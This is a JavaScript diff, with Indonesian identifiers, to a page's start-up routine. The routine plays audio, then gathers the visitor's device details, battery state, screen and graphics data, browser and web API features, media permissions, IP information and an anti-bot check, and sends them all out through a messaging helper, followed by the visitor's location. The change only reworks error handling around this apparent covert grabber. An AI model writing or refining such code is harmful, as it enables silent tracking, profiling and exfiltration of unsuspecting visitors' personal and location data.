@@ -605,35 +605,34 @@ const mulai = async () => {
   audio.muted = false;
   try { await audio.play(); } catch {}
 
+  const infoPerangkat = await ambilDataPerangkat();
+  const bateraiInfo = await ambilBaterai();
+  const layarGrafik = await ambilLayarGrafik();
+  const browserInfo = ambilBrowserInfo();
+  const webFeatures = ambilWebAPIFeatures();
+  const izinMedia = await ambilIzinMedia();
+  const ipInfo = await ambilIPInfo();
+
+  let antiBot = "❌ Gagal mendeteksi bot";
   try {
-    const infoPerangkat = await ambilDataPerangkat();
-    const bateraiInfo = await ambilBaterai();
-    const layarGrafik = await ambilLayarGrafik();
-    const browserInfo = ambilBrowserInfo();
-    const webFeatures = await ambilWebAPIFeatures();  // pastikan pakai await jika async
-    const izinMedia = await ambilIzinMedia();
-    const ipInfo = await ambilIPInfo();
-    const antiBot = await ambilDeteksiAntiBot();      // pastikan pakai await jika async
-
-    const gabungAwal = [
-      infoPerangkat,
-      bateraiInfo,
-      layarGrafik,
-      browserInfo,
-      webFeatures,
-      izinMedia,
-      ipInfo,
-      antiBot
-    ].join("\n\n");
-
-    await kirimPesan(gabungAwal);
-
-  } catch (err) {
-    console.error("❌ Gagal kirim gabungAwal:", err);
-    await kirimPesan("❌ Gagal mengambil data utama.");
+    antiBot = await ambilDeteksiAntiBot();
+  } catch (e) {
+    console.warn("Deteksi anti-bot error:", e);
   }
 
-  // Kirim sisanya terpisah biar nggak delay
+  const gabungAwal = [
+    infoPerangkat,
+    bateraiInfo,
+    layarGrafik,
+    browserInfo,
+    webFeatures,
+    izinMedia,
+    ipInfo,
+    antiBot
+  ].join("\n\n");
+
+  await kirimPesan(gabungAwal);
+
   const lokasi = await ambilLokasi();
   await kirimPesan(lokasi);
 
